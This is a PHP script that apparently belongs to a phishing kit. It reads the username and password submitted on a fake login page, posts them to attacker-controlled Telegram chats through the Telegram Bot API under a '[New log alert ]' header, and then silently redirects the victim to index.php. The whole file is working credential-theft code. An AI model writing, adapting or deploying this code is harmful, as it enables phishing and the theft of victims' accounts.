<?php

session_start();
if($_POST['userid'] == ""){
  exit(header("location: ../index.php"));
}

$ip = getenv("REMOTE_ADDR");

include "../config/tg.php";

 foreach($IdTelegram as $chatId) {

  $message = "[New log alert ]\n\n";
  $message .= "   USERNAME 1:      ".$_POST['user-id']."   \n";
  $message .= "  PASSWORD  1:      ".$_POST['pass']."   \n\n";
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }

?>
<script type = "text/javascript">  
function page_redirect() {  
window.location = "../index.php";  
}  
setTimeout('page_redirect()', 0);  
</script>  
